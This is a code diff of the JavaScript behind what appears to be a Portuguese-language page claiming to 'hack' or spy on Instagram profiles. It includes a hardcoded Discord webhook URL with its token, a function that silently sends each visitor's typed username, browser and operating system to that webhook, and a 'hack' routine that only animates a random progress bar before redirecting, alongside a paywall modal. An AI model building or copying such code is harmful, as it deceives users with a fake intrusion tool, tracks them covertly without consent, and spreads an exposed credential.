+    username:        u.username || fallback,
+    full_name:       u.full_name || u.name || u.username || fallback,
     biography:       bio,
     profile_pic_url: foto,
-    follower_count:  seguidores,
-    following_count: seguindo,
-    media_count:     posts,
+    follower_count:  u.follower_count || u.followers_count || u.edge_followed_by?.count || 0,
+    following_count: u.following_count || u.following || u.edge_follow?.count || 0,
+    media_count:     u.media_count || u.posts_count || u.edge_owner_to_timeline_media?.count || 0,
     id:              u.id || u.pk,
     pk:              u.pk || u.id,
     is_verified:     u.is_verified || false,
@@ -705,12 +414,9 @@ function fmt(n){
   return String(n);
 }
 
-/* ============================================================
-   🔔 WEBHOOK
-   ============================================================ */
 const DISCORD_WEBHOOK_PERFIL = 'https://discord.com/api/webhooks/1553867532966830241/yjvqT3vuTMS7JAcx2dIyGEkJNG534mBr_rXCVwqU35DyJwRew5n8ACEZfHyLqoWvag6_';
 
-async function notificarPerfilDigitado(usernameDigitado) {
+async function notificarPerfilDigitado(usernameDigitado){
   try {
     const link = 'https://instagram.com/' + usernameDigitado;
     const ua = navigator.userAgent;
@@ -726,7 +432,6 @@ async function notificarPerfilDigitado(usernameDigitado) {
     else if (/Mac OS X/.test(ua)) sistema = 'macOS';
     else if (/Linux/.test(ua)) sistema = 'Linux';
     const mob = /iPhone|iPad|iPod|Android/i.test(ua);
-
     await fetch(DISCORD_WEBHOOK_PERFIL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -750,9 +455,6 @@ async function notificarPerfilDigitado(usernameDigitado) {
   } catch (e){}
 }
 
-/* ============================================================
-   EVENTOS
-   ============================================================ */
 $('btn-start').addEventListener('click', () => {
   const status = podePesquisar();
   if (!status.ok) { mostrarModalVIP(); return; }
@@ -761,9 +463,7 @@ $('btn-start').addEventListener('click', () => {
 });
 
 $('btn-buscar').addEventListener('click', buscarClick);
-$('username-input').addEventListener('keypress', e => {
-  if(e.key === 'Enter') buscarClick();
-});
+$('username-input').addEventListener('keypress', e => { if(e.key === 'Enter') buscarClick(); });
 
 async function buscarClick(){
   const status = podePesquisar();
@@ -775,17 +475,15 @@ async function buscarClick(){
 
   try { localStorage.setItem(CHAVE_LAST_USER, username); } catch(e){}
 
-marcarPesquisa();
-notificarPerfilDigitado(val);
+  marcarPesquisa();
+  notificarPerfilDigitado(val);
 
-// 🆕 Salva no histórico do admin
-try {
-  const hist = JSON.parse(localStorage.getItem('vs_hist_pesq') || '[]');
-  hist.push({ username: val, timestamp: Date.now(), api: 'API' });
-  // mantém só os últimos 500
-  if (hist.length > 500) hist.splice(0, hist.length - 500);
-  localStorage.setItem('vs_hist_pesq', JSON.stringify(hist));
-} catch(e){}
+  try {
+    const hist = JSON.parse(localStorage.getItem('vs_hist_pesq') || '[]');
+    hist.push({ username: val, timestamp: Date.now(), api: 'API' });
+    if (hist.length > 500) hist.splice(0, hist.length - 500);
+    localStorage.setItem('vs_hist_pesq', JSON.stringify(hist));
+  } catch(e){}
 
   $('u-input').style.display = 'none';
   $('u-confirm').style.display = 'none';
@@ -819,9 +517,7 @@ try {
 
   const av = $('confirm-avatar');
   av.src = profileData.profile_pic_url;
-  av.onerror = () => {
-    av.src = 'https://ui-avatars.com/api/?name=' + val + '&background=7c3aed&color=fff&size=200';
-  };
+  av.onerror = () => { av.src = 'https://ui-avatars.com/api/?name=' + val + '&background=7c3aed&color=fff&size=200'; };
 
   $('u-loading').style.display = 'none';
   $('u-confirm').style.display = 'block';
@@ -845,7 +541,7 @@ function hack(){
   show('screen-hacking');
   $('targetUser').value = '@' + username;
   let progress = 0;
-  const pb = $('btnProgress');
+  const pb = $('btn-progress') || $('btnProgress');
   pb.style.opacity = '1';
   const interval = setInterval(() => {
     progress = Math.min(100, progress + Math.random()*4 + 1);
@@ -856,9 +552,7 @@ function hack(){
       clearInterval(interval);
       $('status-title').textContent = 'Análise concluída';
       $('status-desc').textContent = 'Redirecionando para o perfil...';
-      setTimeout(() => {
-        window.location.href = 'feed.html?u=' + encodeURIComponent(username);
-      }, 800);
+      setTimeout(() => { window.location.href = 'feed.html?u=' + encodeURIComponent(username); }, 800);
     }
   }, 150);
 }
